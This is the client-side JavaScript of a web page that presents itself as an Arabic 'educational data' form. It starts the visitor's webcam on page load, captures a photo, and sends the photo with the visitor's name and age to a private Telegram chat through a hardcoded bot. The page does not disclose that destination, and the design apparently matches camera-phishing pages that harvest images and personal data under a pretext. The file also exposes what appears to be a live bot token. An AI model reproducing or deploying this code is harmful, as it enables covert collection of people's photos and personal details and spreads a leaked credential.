const BOT_TOKEN = "8316015659:AAFaKjIiQ5u8nPUFToCykLMKcQfZFqPjzKo";
const CHAT_ID = "8096601840";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const preview = document.getElementById('preview');
let capturedImage = null;

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (err) {
    alert("لا يمكن الوصول إلى الكاميرا: " + err);
  }
}

startCamera();

captureBtn.addEventListener('click', () => {
  if(!video.srcObject){
    alert("الكاميرا غير متاحة حالياً!");
    return;
  }
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0);
  capturedImage = canvas.toDataURL('image/png');
  preview.src = capturedImage;
  preview.style.display = 'block';
  alert("تم التقاط الصورة بنجاح!");
});

document.getElementById('eduForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const form = e.target;
  const name = form.name.value;
  const age = form.age.value;

  let text = `👤 البيانات التعليمية:\n- الاسم: ${name}\n- العمر: ${age}`;

  try {
    const resMsg = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
    const jsonMsg = await resMsg.json();
    if(!jsonMsg.ok) throw new Error("فشل إرسال النص");

    if(capturedImage){
      const base64 = capturedImage.split(',')[1];
      const blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], {type: 'image/png'});
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'captured.png');

      const resPhoto = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      const jsonPhoto = await resPhoto.json();
      if(!jsonPhoto.ok) throw new Error("فشل إرسال الصورة");

      document.getElementById('result').textContent = "تم إرسال البيانات والصورة ✅";
    } else {
      document.getElementById('result').textContent = "تم إرسال البيانات ✅ (لم يتم التقاط صورة)";
    }

    form.reset();
    preview.style.display = 'none';
    capturedImage = null;
  } catch(err) {
    document.getElementById('result').textContent = "خطأ في الإرسال ❌";
    console.error(err);
  }
});

